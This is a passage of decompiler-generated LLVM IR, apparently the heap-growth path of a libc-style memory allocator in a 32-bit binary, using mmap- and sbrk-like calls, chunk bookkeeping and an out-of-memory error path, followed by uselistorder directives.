  %v3_804e2e2 = phi i32 [ %v0_804e2d7.pre, %dec_label_pc_804e2c2.dec_label_pc_804e2d7_crit_edge ], [ %v5_804e2d3, %dec_label_pc_804e2cb ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_804e2e2, 1048576
  %v5_804e2e2 = select i1 %tmp88, i32 1048576, i32 %v3_804e2e2
  store i32 %v5_804e2e2, i32* @esi, align 4
  %tmp133 = icmp ugt i32 %v5_804e2e2, %v1_804e1b6
  br i1 %tmp133, label %dec_label_pc_804e2ef, label %dec_label_pc_804e534

dec_label_pc_804e2ef:                             ; preds = %dec_label_pc_804e2d7
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804e2fc = call i32 @function_804f994(i32 0, i32 %v5_804e2e2, i32 3, i32 34, i32 0, i32 0, i32 %v0_804e2ef, i32 %v0_804e2ef)
  store i32 %v8_804e2fc, i32* %eax.global-to-local, align 4
  %v10_804e304 = icmp eq i32 %v8_804e2fc, -1
  store i32 %v8_804e2fc, i32* @ebx, align 4
  br i1 %v10_804e304, label %dec_label_pc_804e534, label %dec_label_pc_804e30f

dec_label_pc_804e30f:                             ; preds = %dec_label_pc_804e2ef
  %v0_804e30f = load i8, i8* @global_var_8059100.157, align 1
  %v2_804e30f = and i8 %v0_804e30f, -2
  store i8 %v2_804e30f, i8* @global_var_8059100.157, align 256
  %v1_804e316 = load i32, i32* @esi, align 4
  %v2_804e316 = add i32 %v1_804e316, %v8_804e2fc
  store i32 %v2_804e316, i32* @edx, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804e319:                             ; preds = %dec_label_pc_804e2ac, %dec_label_pc_804e30f
  %v0_804e3e0 = phi i32 [ -1, %dec_label_pc_804e2ac ], [ %v2_804e316, %dec_label_pc_804e30f ]
  %v0_804e3ee = phi i32 [ %v1_804e2b0, %dec_label_pc_804e2ac ], [ %v8_804e2fc, %dec_label_pc_804e30f ]
  %v10_804e319 = icmp eq i32 %v0_804e3ee, -1
  br i1 %v10_804e319, label %dec_label_pc_804e534, label %dec_label_pc_804e322

dec_label_pc_804e322:                             ; preds = %dec_label_pc_804e319
  %v0_804e326 = load i32, i32* @global_var_8059108.154, align 8
  %v1_804e326 = load i32, i32* @esi, align 4
  %v2_804e326 = add i32 %v1_804e326, %v0_804e326
  store i32 %v2_804e326, i32* @global_var_8059108.154, align 8
  %v2_804e32c = add i32 %v1_804e27e, %v0_804e26e
  store i32 %v2_804e32c, i32* %ecx.global-to-local, align 4
  %v2_804e32e = sub i32 %v0_804e3ee, %v2_804e32c
  %v7_804e32e = icmp ult i32 %v0_804e3ee, %v2_804e32c
  %v12_804e32e = icmp eq i32 %v2_804e32e, 0
  %v1_804e330 = icmp eq i1 %v12_804e32e, false
  br i1 %v1_804e330, label %dec_label_pc_804e349, label %dec_label_pc_804e332

dec_label_pc_804e332:                             ; preds = %dec_label_pc_804e322
  %v10_804e332 = icmp eq i32 %v0_804e3e0, -1
  %v1_804e335 = icmp eq i1 %v10_804e332, false
  br i1 %v1_804e335, label %dec_label_pc_804e349, label %dec_label_pc_804e337

dec_label_pc_804e337:                             ; preds = %dec_label_pc_804e332
  store i32 %v0_804e26e, i32* %ecx.global-to-local, align 4
  %v2_804e33b = add i32 %v1_804e326, %v1_804e27e
  %v1_804e33e = or i32 %v2_804e33b, 1
  store i32 %v1_804e33e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e33e, i32* %v2_804e277, align 4
  br label %dec_label_pc_804e476

dec_label_pc_804e349:                             ; preds = %dec_label_pc_804e332, %dec_label_pc_804e322
  %v0_804e349 = load i8, i8* @global_var_8059100.157, align 1
  %v1_804e349 = sext i8 %v0_804e349 to i32
  store i32 %v1_804e349, i32* %eax.global-to-local, align 4
  %v2_804e34e = urem i8 %v0_804e349, 2
  %v3_804e34e = icmp eq i8 %v2_804e34e, 0
  br i1 %v3_804e34e, label %dec_label_pc_804e362, label %dec_label_pc_804e352

dec_label_pc_804e352:                             ; preds = %dec_label_pc_804e349
  br i1 %v2_804e27e, label %dec_label_pc_804e362, label %dec_label_pc_804e356

dec_label_pc_804e356:                             ; preds = %dec_label_pc_804e352
  %v1_804e358 = icmp eq i1 %v7_804e32e, false
  br i1 %v1_804e358, label %dec_label_pc_804e362, label %dec_label_pc_804e35a

dec_label_pc_804e35a:                             ; preds = %dec_label_pc_804e356
  %v1_804e35a = and i32 %v1_804e349, -2
  %v4_804e35a = trunc i32 %v1_804e35a to i8
  store i32 %v1_804e35a, i32* %eax.global-to-local, align 4
  store i8 %v4_804e35a, i8* @global_var_8059100.157, align 256
  br label %dec_label_pc_804e362

dec_label_pc_804e362:                             ; preds = %dec_label_pc_804e356, %dec_label_pc_804e352, %dec_label_pc_804e349, %dec_label_pc_804e35a
  %v0_804e362 = phi i8 [ %v0_804e349, %dec_label_pc_804e356 ], [ %v0_804e349, %dec_label_pc_804e352 ], [ %v0_804e349, %dec_label_pc_804e349 ], [ %v4_804e35a, %dec_label_pc_804e35a ]
  %v1_804e362 = urem i8 %v0_804e362, 2
  %v2_804e362 = icmp eq i8 %v1_804e362, 0
  br i1 %v2_804e362, label %dec_label_pc_804e3e0, label %dec_label_pc_804e36b

dec_label_pc_804e36b:                             ; preds = %dec_label_pc_804e362
  br i1 %v2_804e27e, label %dec_label_pc_804e379, label %dec_label_pc_804e36f

dec_label_pc_804e36f:                             ; preds = %dec_label_pc_804e36b
  store i32 %v2_804e32e, i32* %eax.global-to-local, align 4
  %v2_804e373 = add i32 %v2_804e326, %v2_804e32e
  store i32 %v2_804e373, i32* @global_var_8059108.154, align 8
  br label %dec_label_pc_804e379

dec_label_pc_804e379:                             ; preds = %dec_label_pc_804e36b, %dec_label_pc_804e36f
  %v1_804e37b = urem i32 %v0_804e3ee, 8
  %v2_804e37b = icmp eq i32 %v1_804e37b, 0
  store i32 %v1_804e37b, i32* %edx.global-to-local, align 4
  %v1_804e37e = icmp eq i1 %v2_804e37b, false
  br i1 %v1_804e37e, label %dec_label_pc_804e386, label %dec_label_pc_804e380

dec_label_pc_804e380:                             ; preds = %dec_label_pc_804e379
  store i32 %v0_804e3ee, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e390

dec_label_pc_804e386:                             ; preds = %dec_label_pc_804e379
  %v2_804e38b = sub nsw i32 8, %v1_804e37b
  store i32 %v2_804e38b, i32* %eax.global-to-local, align 4
  %v2_804e38d = add i32 %v2_804e38b, %v0_804e3ee
  store i32 %v2_804e38d, i32* @edi, align 4
  br label %dec_label_pc_804e390

dec_label_pc_804e390:                             ; preds = %dec_label_pc_804e380, %dec_label_pc_804e386
  %v0_804e39d = phi i32 [ 0, %dec_label_pc_804e380 ], [ %v2_804e38b, %dec_label_pc_804e386 ]
  %v2_804e390 = add i32 %v1_804e326, %v0_804e3ee
  %v2_804e39d = add i32 %v0_804e39d, %v1_804e27e
  store i32 %v2_804e39d, i32* %ecx.global-to-local, align 4
  %v2_804e3a0 = add i32 %v2_804e39d, %v2_804e390
  store i32 %v2_804e3a0, i32* %edx.global-to-local, align 4
  %v2_804e3a2 = add i32 %v2_804e3a0, %v1_804e190
  %v5_804e3a5 = and i32 %v2_804e3a2, %v1_804e2a0
  %v2_804e3ac = sub i32 %v5_804e3a5, %v2_804e3a0
  store i32 %v2_804e3ac, i32* %eax.global-to-local, align 4
  %v2_804e3ae = add i32 %v2_804e3ac, %v2_804e39d
  store i32 %v2_804e3ae, i32* @esi, align 4
  store i32 %v2_804e3ae, i32* %stack_var_-92, align 4
  %v1_804e3b2 = call i32 @function_804fdb8(i32 %v2_804e3ae)
  store i32 %v1_804e3b2, i32* %eax.global-to-local, align 4
  %v10_804e3ba = icmp eq i32 %v1_804e3b2, -1
  store i32 %v1_804e3b2, i32* %edx.global-to-local, align 4
  %v1_804e3bf = icmp eq i1 %v10_804e3ba, false
  br i1 %v1_804e3bf, label %dec_label_pc_804e3cf, label %dec_label_pc_804e3c1

dec_label_pc_804e3c1:                             ; preds = %dec_label_pc_804e390
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e3c6 = call i32 @function_804fdb8(i32 0)
  store i32 %v1_804e3c6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3c6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e403

dec_label_pc_804e3cf:                             ; preds = %dec_label_pc_804e390
  %v1_804e3cf = load i32, i32* @ebx, align 4
  %v7_804e3cf = icmp ult i32 %v1_804e3b2, %v1_804e3cf
  %v1_804e3d1 = icmp eq i1 %v7_804e3cf, false
  br i1 %v1_804e3d1, label %dec_label_pc_804e408, label %dec_label_pc_804e3d3

dec_label_pc_804e3d3:                             ; preds = %dec_label_pc_804e3cf
  %v0_804e3d3 = load i8, i8* @global_var_8059100.157, align 1
  %v2_804e3d3 = and i8 %v0_804e3d3, -2
  store i8 %v2_804e3d3, i8* @global_var_8059100.157, align 256
  store i32 %v2_804e390, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e3e7

dec_label_pc_804e3e0:                             ; preds = %dec_label_pc_804e362
  %v10_804e3e0 = icmp eq i32 %v0_804e3e0, -1
  br i1 %v10_804e3e0, label %dec_label_pc_804e3eb, label %dec_label_pc_804e3e5

dec_label_pc_804e3e5:                             ; preds = %dec_label_pc_804e3e0
  store i32 %v0_804e3ee, i32* @edi, align 4
  br label %dec_label_pc_804e3e7

dec_label_pc_804e3e7:                             ; preds = %dec_label_pc_804e3d3, %dec_label_pc_804e3e5
  %v0_804e40847 = phi i32 [ %v2_804e390, %dec_label_pc_804e3d3 ], [ %v0_804e3e0, %dec_label_pc_804e3e5 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e408

dec_label_pc_804e3eb:                             ; preds = %dec_label_pc_804e3e0
  store i32 %v0_804e3ee, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e3f2 = call i32 @function_804fdb8(i32 0)
  store i32 %v1_804e3f2, i32* %edx.global-to-local, align 4
  %v1_804e3f9 = load i32, i32* @ebx, align 4
  %v2_804e3f9 = sub i32 %v1_804e3f2, %v1_804e3f9
  %v1_804e3fb = load i32, i32* @esi, align 4
  %v2_804e3fb = sub i32 %v2_804e3f9, %v1_804e3fb
  store i32 %v2_804e3fb, i32* %eax.global-to-local, align 4
  %v0_804e3fd = load i32, i32* @global_var_8059108.154, align 8
  %v2_804e3fd = add i32 %v0_804e3fd, %v2_804e3fb
  store i32 %v2_804e3fd, i32* @global_var_8059108.154, align 8
  br label %dec_label_pc_804e403

dec_label_pc_804e403:                             ; preds = %dec_label_pc_804e3c1, %dec_label_pc_804e3eb
  %v0_804e40846 = phi i32 [ %v1_804e3c6, %dec_label_pc_804e3c1 ], [ %v1_804e3f2, %dec_label_pc_804e3eb ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e408

dec_label_pc_804e408:                             ; preds = %dec_label_pc_804e3cf, %dec_label_pc_804e3e7, %dec_label_pc_804e403
  %v0_804e40d = phi i32 [ %v1_804e3b2, %dec_label_pc_804e3cf ], [ %v0_804e40847, %dec_label_pc_804e3e7 ], [ %v0_804e40846, %dec_label_pc_804e403 ]
  %v10_804e408 = icmp eq i32 %v0_804e40d, -1
  br i1 %v10_804e408, label %dec_label_pc_804e476, label %dec_label_pc_804e40d

dec_label_pc_804e40d:                             ; preds = %dec_label_pc_804e408
  %v1_804e40d = load i32, i32* @edi, align 4
  %v2_804e40d = sub i32 %v0_804e40d, %v1_804e40d
  store i32 %v2_804e40d, i32* %edx.global-to-local, align 4
  %v1_804e40f = load i32, i32* @esi, align 4
  %v2_804e40f = add i32 %v1_804e40f, %v2_804e40d
  %v1_804e412 = or i32 %v2_804e40f, 1
  store i32 %v1_804e412, i32* %eax.global-to-local, align 4
  store i32 %v1_804e40d, i32* @global_var_8058dcc.142, align 4
  %v2_804e41b = add i32 %v1_804e40d, 4
  %v3_804e41b = inttoptr i32 %v2_804e41b to i32*
  store i32 %v1_804e412, i32* %v3_804e41b, align 4
  %v0_804e41e = load i32, i32* @global_var_8059108.154, align 8
  %v1_804e41e = load i32, i32* @esi, align 4
  %v2_804e41e = add i32 %v1_804e41e, %v0_804e41e
  store i32 %v2_804e41e, i32* @global_var_8059108.154, align 8
  br i1 %v2_804e27e, label %dec_label_pc_804e476, label %dec_label_pc_804e428

dec_label_pc_804e428:                             ; preds = %dec_label_pc_804e40d
  store i32 %v0_804e26e, i32* %ecx.global-to-local, align 4
  %v1_804e42c = add i32 %v1_804e27e, -12
  %v1_804e42f = and i32 %v1_804e42c, -8
  store i32 %v1_804e42f, i32* %eax.global-to-local, align 4
  %v1_804e434 = or i32 %v1_804e42f, 1
  store i32 %v1_804e434, i32* %edx.global-to-local, align 4
  %v5_804e437 = icmp ult i32 %v1_804e42f, 15
  store i32 %v1_804e434, i32* %v2_804e277, align 4
  %v0_804e43d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e43d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e43d = add i32 %v0_804e43d, 4
  %v3_804e43d = add i32 %v2_804e43d, %v1_804e43d
  %v4_804e43d = inttoptr i32 %v3_804e43d to i32*
  store i32 5, i32* %v4_804e43d, align 4
  %v0_804e445 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e445 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e445 = add i32 %v0_804e445, 8
  %v3_804e445 = add i32 %v2_804e445, %v1_804e445
  %v4_804e445 = inttoptr i32 %v3_804e445 to i32*
  store i32 5, i32* %v4_804e445, align 4
  br i1 %v5_804e437, label %dec_label_pc_804e476, label %dec_label_pc_804e44f

dec_label_pc_804e44f:                             ; preds = %dec_label_pc_804e428
  %v0_804e44f = load i32, i32* @global_var_80590e4.158, align 4
  store i32 %v0_804e44f, i32* @ebx, align 4
  %v0_804e455 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e45a = add i32 %v0_804e455, 8
  store i32 %v1_804e45a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e45a, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_80590e4.158, align 4
  %v1_804e468 = call i32 @function_804eac9(i32 %v1_804e45a)
  store i32 %v1_804e468, i32* %eax.global-to-local, align 4
  %v0_804e470 = load i32, i32* @ebx, align 4
  store i32 %v0_804e470, i32* @global_var_80590e4.158, align 4
  br label %dec_label_pc_804e476

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e428, %dec_label_pc_804e40d, %dec_label_pc_804e408, %dec_label_pc_804e337, %dec_label_pc_804e44f
  %v0_804e476 = load i32, i32* @global_var_8059108.154, align 8
  %v0_804e47b = load i32, i32* @global_var_805910c.159, align 4
  %v0_804e487 = load i32, i32* @global_var_8058dcc.142, align 4
  store i32 %v0_804e487, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_804e476, %v0_804e47b
  %v5_804e48d = select i1 %tmp89, i32 %v0_804e47b, i32 %v0_804e476
  store i32 %v5_804e48d, i32* @edx, align 4
  %v1_804e490 = load i32, i32* @global_var_8059104.153, align 4
  %v2_804e490 = add i32 %v1_804e490, %v0_804e476
  store i32 %v5_804e48d, i32* @global_var_805910c.159, align 4
  %v1_804e49c = load i32, i32* @global_var_8059114.155, align 4
  %tmp90 = icmp ule i32 %v2_804e490, %v1_804e49c
  %v5_804e4a2 = select i1 %tmp90, i32 %v1_804e49c, i32 %v2_804e490
  store i32 %v5_804e4a2, i32* %eax.global-to-local, align 4
  store i32 %v5_804e4a2, i32* @global_var_8059114.155, align 4
  %v1_804e4ae = add i32 %v0_804e487, 4
  %v2_804e4ae = inttoptr i32 %v1_804e4ae to i32*
  %v3_804e4ae = load i32, i32* %v2_804e4ae, align 4
  %v1_804e4b1 = and i32 %v3_804e4ae, -4
  store i32 %v1_804e4b1, i32* @ecx, align 4
  %v10_804e4b4 = icmp ult i32 %v1_804e4b1, %v1_804e12e
  br i1 %v10_804e4b4, label %dec_label_pc_804e534, label %dec_label_pc_804e4ba

dec_label_pc_804e4ba:                             ; preds = %dec_label_pc_804e476
  store i32 %v1_804e1b6, i32* %esi.global-to-local, align 4
  %v2_804e4c0 = sub i32 %v1_804e4b1, %v1_804e1b6
  store i32 %v2_804e4c0, i32* %ecx.global-to-local, align 4
  %v2_804e4c2 = add i32 %v0_804e487, %v1_804e1b6
  store i32 %v2_804e4c2, i32* @edx, align 4
  %v1_804e4c5 = or i32 %v1_804e1b6, 1
  store i32 %v1_804e4c5, i32* %eax.global-to-local, align 4
  store i32 %v2_804e4c2, i32* @global_var_8058dcc.142, align 4
  store i32 %v1_804e4c5, i32* %v2_804e4ae, align 4
  %v0_804e4d1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e4d1

dec_label_pc_804e4d1:                             ; preds = %dec_label_pc_804e13c, %dec_label_pc_804e4ba
  %v0_804e4d1 = phi i32 [ %v5_804e14f, %dec_label_pc_804e13c ], [ %v0_804e4d1.pre, %dec_label_pc_804e4ba ]
  %v1_804e4d1 = or i32 %v0_804e4d1, 1
  store i32 %v1_804e4d1, i32* @ecx, align 4
  %v0_804e4d4 = load i32, i32* @ebx, align 4
  %v1_804e4d4 = add i32 %v0_804e4d4, 8
  store i32 %v1_804e4d4, i32* %ebx.global-to-local, align 4
  %v1_804e4d7 = load i32, i32* @edx, align 4
  %v2_804e4d7 = add i32 %v1_804e4d7, 4
  %v3_804e4d7 = inttoptr i32 %v2_804e4d7 to i32*
  store i32 %v1_804e4d1, i32* %v3_804e4d7, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e4dc:                             ; preds = %dec_label_pc_804deee
  %v5_804e4e2 = sub i32 %v1_804ded1, %v1_804e1b6
  store i32 %v5_804e4e2, i32* %eax.global-to-local, align 4
  %v2_804e4e6 = add i32 %v0_804df9c113, %v1_804e1b6
  store i32 %v2_804e4e6, i32* @edx, align 4
  %v1_804e4ea = or i32 %v1_804e1b6, 1
  store i32 %v2_804e4e6, i32* @global_var_8058dd0.143, align 16
  store i32 %v1_804e4ea, i32* %v2_804decb, align 4
  %v0_804e4f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4f8 = or i32 %v0_804e4f6, 1
  store i32 %v1_804e4f8, i32* @ecx, align 4
  %v0_804e4fb = load i32, i32* @edx, align 4
  store i32 %v0_804e4fb, i32* @global_var_8058ddc.160, align 4
  store i32 %v0_804e4fb, i32* @global_var_8058de0.145, align 32
  %v1_804e507 = add i32 %v0_804e4fb, 8
  %v2_804e507 = inttoptr i32 %v1_804e507 to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e507, align 4
  %v0_804e50e = load i32, i32* @edx, align 4
  %v1_804e50e = add i32 %v0_804e50e, 12
  %v2_804e50e = inttoptr i32 %v1_804e50e to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e50e, align 4
  %v0_804e515 = load i32, i32* @ecx, align 4
  %v1_804e515 = load i32, i32* @edx, align 4
  %v2_804e515 = add i32 %v1_804e515, 4
  %v3_804e515 = inttoptr i32 %v2_804e515 to i32*
  store i32 %v0_804e515, i32* %v3_804e515, align 4
  %v0_804e518 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e518 = load i32, i32* @edx, align 4
  %v3_804e518 = add i32 %v1_804e518, %v0_804e518
  %v4_804e518 = inttoptr i32 %v3_804e518 to i32*
  store i32 %v0_804e518, i32* %v4_804e518, align 4
  br label %dec_label_pc_804e526

dec_label_pc_804e51d:                             ; preds = %dec_label_pc_804defd
  store i32 %v1_804e1b6, i32* %ebx.global-to-local, align 4
  %v0_804e521 = load i32, i32* @ebp, align 4
  %v2_804e521 = or i32 %v1_804e1b6, 4
  %v3_804e521 = add i32 %v0_804e521, %v2_804e521
  %v4_804e521 = inttoptr i32 %v3_804e521 to i32*
  %v5_804e521 = load i32, i32* %v4_804e521, align 4
  %v6_804e521 = or i32 %v5_804e521, 1
  store i32 %v6_804e521, i32* %v4_804e521, align 4
  br label %dec_label_pc_804e526

dec_label_pc_804e526:                             ; preds = %dec_label_pc_804e4dc, %dec_label_pc_804e51d
  %v0_804e526 = load i32, i32* @ebp, align 4
  %v1_804e526 = add i32 %v0_804e526, 8
  store i32 %v1_804e526, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e52b:                             ; preds = %dec_label_pc_804dfed
  %v1_804e52b = load i32, i32* @ebx, align 4
  %v2_804e52b = add i32 %v0_804dff9, 4
  %v3_804e52b = add i32 %v2_804e52b, %v1_804e52b
  %v4_804e52b = inttoptr i32 %v3_804e52b to i32*
  %v5_804e52b = load i32, i32* %v4_804e52b, align 4
  %v6_804e52b = or i32 %v5_804e52b, 1
  store i32 %v6_804e52b, i32* %v4_804e52b, align 4
  br label %dec_label_pc_804e530

dec_label_pc_804e530:                             ; preds = %dec_label_pc_804e005, %dec_label_pc_804e52b
  %v0_804e530 = load i32, i32* @ecx, align 4
  store i32 %v0_804e530, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e534:                             ; preds = %dec_label_pc_804e2d7, %dec_label_pc_804e476, %dec_label_pc_804e319, %dec_label_pc_804e2ef
  %v0_804e534 = load i32, i32* %stack_var_-92, align 4
  %v1_804e534 = call i32 @function_804baa4(i32 %v0_804e534)
  store i32 %v1_804e534, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804e53b = inttoptr i32 %v1_804e534 to i32*
  store i32 12, i32* %v1_804e53b, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e541:                             ; preds = %dec_label_pc_804e530, %dec_label_pc_804e526, %dec_label_pc_804e4d1, %dec_label_pc_804e167, %dec_label_pc_804e119, %dec_label_pc_804de98, %dec_label_pc_804e534
  store i32 %v2_804ddcf, i32* @eax, align 4
  store i32 %v2_804ddcf, i32* %stack_var_-92, align 4
  %v2_804e54a = call i32 @function_804f65e(i32 %v2_804ddcf, i32 1)
  store i32 %v2_804e54a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e552

dec_label_pc_804e552:                             ; preds = %dec_label_pc_804dded, %dec_label_pc_804e541
  %v0_804e555 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e555, i32* %eax.global-to-local, align 4
  %v2_804e557 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e557, i32* @ebx, align 4
  store i32 %v0_804ddbc, i32* @esi, align 4
  store i32 %v0_804ddbb, i32* @edi, align 4
  store i32 %v0_804ddba, i32* @ebp, align 4
  ret i32 %v0_804e555

; uselistorder directives
  uselistorder i32 %v0_804e518, { 1, 0 }
  uselistorder i32 %v1_804e49c, { 1, 0 }
  uselistorder i32 %v2_804e490, { 1, 0 }
  uselistorder i32 %v0_804e47b, { 1, 0 }
  uselistorder i32 %v0_804e476, { 0, 2, 1 }
  uselistorder i32 %v1_804e40d, { 1, 0, 2 }
  uselistorder i32 %v0_804e40d, { 1, 0 }
  uselistorder i32 %v2_804e3fb, { 1, 0 }
  uselistorder i32 %v1_804e3b2, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804e3a0, { 1, 0, 2 }
  uselistorder i32 %v2_804e390, { 1, 2, 0 }
  uselistorder i32 %v2_804e38b, { 1, 0, 2 }
  uselistorder i32 %v1_804e37b, { 2, 1, 0 }
  uselistorder i8 %v0_804e349, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804e32c, { 1, 0, 2 }
  uselistorder i32 %v0_804e3ee, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_804e3e0, { 2, 0, 1 }
  uselistorder i32 %v8_804e2fc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_804e2e2, { 1, 0, 2 }
  uselistorder i32 %v3_804e2e2, { 1, 0 }
  uselistorder i32 %v1_804e2b0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804e2a4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e2a0, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804e28e, { 1, 0 }
  uselistorder i32 %v1_804e27e, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804e26e, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804e257, { 1, 0 }
  uselistorder i32 %v2_804e24b, { 1, 0 }
  uselistorder i32 %v2_804e23b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e21f, { 1, 2, 0 }
  uselistorder i32 %v1_804e21f, { 1, 0, 2 }
  uselistorder i32 %v1_804e21e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e218, { 1, 0 }
  uselistorder i32 %v2_804e1f6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e1ea, { 2, 1, 0 }
  uselistorder i32 %v8_804e1d5, { 5, 4, 2, 1, 3, 0, 6 }
  uselistorder i32 %v2_804e1bc, { 1, 0, 2 }
  uselistorder i32 %v0_804e15f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804e12e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804e121, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804e107, { 1, 0, 2 }
  uselistorder i32 %v1_804e0a1, { 1, 0 }
  uselistorder i32 %v3_804e096, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804e090, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804e08d12, { 1, 0 }
  uselistorder i32 %v2_804e082, { 1, 0 }
  uselistorder i32 %v1_804e066, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804e062, { 2, 1, 0 }
  uselistorder i32 %v1_804e05e, { 1, 0 }
  uselistorder i32 %v1_804e059, { 2, 1, 0 }
  uselistorder i32 %v2_804e048, { 1, 0 }
  uselistorder i32 %v1_804e045, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804dfe3, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804e02e, { 1, 0 }
  uselistorder i32 %v0_804dff9, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804dfcf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804df9c, { 0, 2, 1 }
  uselistorder i32 %v2_804df80, { 1, 0 }
  uselistorder i32 %v1_804df76, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804df71.lcssa, { 1, 0 }
  uselistorder i32 %v3_804df61, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804df58, { 1, 0, 2 }
  uselistorder i32 %v3_804df3b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804df34, { 1, 0, 2 }
  uselistorder i32 %v2_804df1c, { 2, 1, 0 }
  uselistorder i32 %v0_804df08, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804dece, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804df9c113, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df9c107, { 1, 0, 2 }
  uselistorder i32 %v3_804de7b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804de6d, { 2, 1, 0 }
  uselistorder i32 %v2_804de48, { 2, 1, 0 }
  uselistorder i8 %v0_804de16, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_804e1b6, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804ddff, { 1, 2, 0 }
  uselistorder i32 %v0_804dde8, { 1, 0 }
  uselistorder i32 %v2_804ddcf, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 1, 12, 13, 15, 16, 17, 18, 0, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8059100.157, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_804f994, { 1, 0 }
  uselistorder i32 134581716, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8058de0.145, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804dd94, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804e552, { 1, 0 }
  uselistorder label %dec_label_pc_804e541, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804e534, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804e530, { 1, 0 }
